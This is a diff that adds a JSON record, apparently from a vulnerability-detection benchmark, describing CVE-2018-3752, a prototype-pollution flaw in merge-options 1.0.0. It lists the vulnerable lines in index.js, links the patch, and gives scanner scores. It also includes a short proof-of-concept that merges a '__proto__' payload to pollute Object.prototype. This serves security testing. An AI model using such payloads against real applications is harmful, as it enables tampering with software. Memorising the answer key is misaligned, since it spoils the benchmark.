@@ -1,0 +1,97 @@
+{
+    "advisory": {
+        "id": "GHSA-qw93-45r3-p66p",
+        "npm_id": "717",
+        "cve": "CVE-2018-3752",
+        "cwe": "CWE-471",
+        "github_link": "https://github.com/advisories/GHSA-qw93-45r3-p66p"
+    },
+    "correct_cwe": "CWE-471",
+    "correct_package_link": "https://registry.npmjs.org/merge-options/-/merge-options-1.0.0.tgz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "block": {
+                    "file": "/index.js",
+                    "start_lineno": 50,
+                    "end_lineno": 50,
+                    "code": "result[key] = clone(array[key]);"
+                }
+            },
+            {
+                "block": {
+                    "file": "/index.js",
+                    "start_lineno": 60,
+                    "end_lineno": 60,
+                    "code": "result[key] = clone(array[key]);"
+                }
+            },
+            {
+                "block": {
+                    "file": "/index.js",
+                    "start_lineno": 72,
+                    "end_lineno": 75,
+                    "code": "if(key in merged){merged[key]=merge(merged[key],source[key],mergeOpts);}else{merged[key]=clone(source[key]);"
+                }
+            },
+            {
+                "block": {
+                    "file": "/index.js",
+                    "start_lineno": 105,
+                    "end_lineno": 105,
+                    "code": "result[resultIndex++] = array[k];"
+                }
+            },
+            {
+                "block": {
+                    "file": "/index.js",
+                    "start_lineno": 107,
+                    "end_lineno": 107,
+                    "code": "result[resultIndex++] = clone(array[k]);"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "var merge = require('merge-options');\r\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\r\nvar a = {};\r\nconsole.log(\"Before : \" + a.oops);\r\nmerge({}, JSON.parse(malicious_payload));\r\nconsole.log(\"After : \" + a.oops);"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/schnittstabil/merge-options/commit/d4a93bc2890455e0931ac0779667023e6cb101d4"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "D"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "D"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "A"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "D"
+        },
+        "drek": {
+            "score": "D"
+        },
+        "mosca": {
+            "score": "D"
+        },
+        "odgen": {
+            "score": "D"
+        }
+    }
+}
